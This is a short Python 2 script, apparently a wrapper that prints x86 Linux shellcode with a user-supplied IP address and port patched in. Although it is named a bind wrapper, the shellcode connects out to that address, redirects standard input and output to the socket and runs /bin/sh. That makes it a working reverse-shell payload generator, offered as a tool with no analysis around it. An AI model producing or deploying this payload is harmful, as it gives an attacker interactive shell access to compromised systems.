import sys

if len(sys.argv) != 3:
	print "./bind_wrapper.py <IP> <PORT>"
	sys.exit(1)

temp1 = sys.argv[1].split(".")

ip = '\\x%0*x' % (2,int(temp1[0])) + '\\x%0*x' % (2,int(temp1[1])) + '\\x%0*x' % (2,int(temp1[2])) + '\\x%0*x' % (2,int(temp1[3]))

temp2 = '%0*x' % (4, int(sys.argv[2]))

port = "\\x" + temp2[0:2] + "\\x" + temp2[2:4]

shellcode = "\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\xb3\\x03\\x68" + ip + "\\x66\\x68" + port + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x5b\\x31\\xc0\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xdb\\xf7\\xe3\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"

print shellcode
